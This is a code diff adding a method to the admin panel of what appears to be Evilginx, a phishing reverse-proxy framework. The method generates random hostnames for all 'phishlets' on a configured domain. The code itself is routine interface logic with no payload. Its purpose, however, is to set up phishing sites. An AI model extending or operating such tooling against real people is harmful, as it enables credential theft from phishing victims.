@@ -1010,6 +1010,46 @@ class EvilginxAdmin {
         }
     }
 
+    async generateAllHostnames() {
+        // First check if domain is set
+        const domain = document.getElementById('cfg-domain').value;
+        if (!domain) {
+            this.toast('error', 'Domain Required', 'Please set a base domain first');
+            return;
+        }
+
+        // Confirm with user
+        if (!confirm(`This will generate random hostnames for all phishlets using domain "${domain}". Continue?`)) {
+            return;
+        }
+
+        try {
+            const result = await this.apiRequest('/phishlets/hostnames/generate-all', {
+                method: 'POST'
+            });
+
+            if (result.success) {
+                const data = result.data || {};
+                const count = Object.keys(data).length;
+                
+                // Show generated hostnames
+                let message = `Generated ${count} hostnames:\n`;
+                for (const [name, hostname] of Object.entries(data)) {
+                    message += `• ${name}: ${hostname}\n`;
+                }
+                
+                this.toast('success', 'Hostnames Generated', result.message);
+                
+                // Reload phishlets to show new hostnames
+                this.loadPhishlets();
+            } else {
+                this.toast('error', 'Error', result.message || 'Failed to generate hostnames');
+            }
+        } catch (error) {
+            this.toast('error', 'Error', 'Network error generating hostnames');
+        }
+    }
+
     async updateBlacklist(mode) {
         const result = await this.apiRequest('/blacklist', {
             method: 'POST',
